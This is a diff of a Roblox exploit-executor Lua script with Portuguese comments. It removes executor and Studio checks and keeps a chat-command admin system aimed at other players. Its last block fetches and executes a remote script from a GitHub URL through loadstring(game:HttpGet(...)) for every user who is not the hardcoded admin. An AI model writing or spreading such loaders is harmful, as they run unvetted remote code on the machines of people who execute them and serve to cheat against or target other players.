@@ -1,18 +1,12 @@
--- Proteção contra cópia
+-- Proteção simples
 if not game:IsLoaded() then game.Loaded:Wait() end
-if game:GetService("RunService"):IsStudio() then return end
-if not identifyexecutor then return end
-if identifyexecutor():lower():find("synapse") == nil then
-    warn("Executor não suportado.")
-    return
-end
 
 -- Lista de administradores
 local admins = {["antimandrak"] = true}
 
--- Função utilitária
+-- Verificação de permissão
 local function isAdmin(plr)
-    return admins[plr.Name] ~= nil
+    return admins[plr.Name] == true
 end
 
 -- Comandos
@@ -39,13 +33,10 @@ local commands = {
     end
 }
 
--- Monitor de mensagens
+-- Monitor de comandos via chat
 game.Players.PlayerAdded:Connect(function(plr)
     plr.Chatted:Connect(function(msg)
-        if not isAdmin(plr) then
-            plr:SendNotification({Title="Sem permissão", Text="Você não tem permissão para usar comandos."})
-            return
-        end
+        if not isAdmin(plr) then return end
 
         local args = msg:split(" ")
         local cmd = args[1]:sub(2):lower()
@@ -55,15 +46,12 @@ game.Players.PlayerAdded:Connect(function(plr)
             local target = game.Players:FindFirstChild(targetName)
             if target and not isAdmin(target) then
                 commands[cmd](target, plr)
-                plr:SendNotification({Title="Comando executado", Text=cmd.." executado com sucesso."})
-            else
-                plr:SendNotification({Title="Erro", Text="Jogador inválido ou protegido."})
             end
         end
     end)
 end)
 
--- Caso o jogador não tenha permissão, ele ainda executa o script externo
+-- Executa script externo normalmente para quem não tem permissão
 if not isAdmin(game.Players.LocalPlayer) then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/KIRITOZINKS/main.lua/main/rael.hub"))()
 end
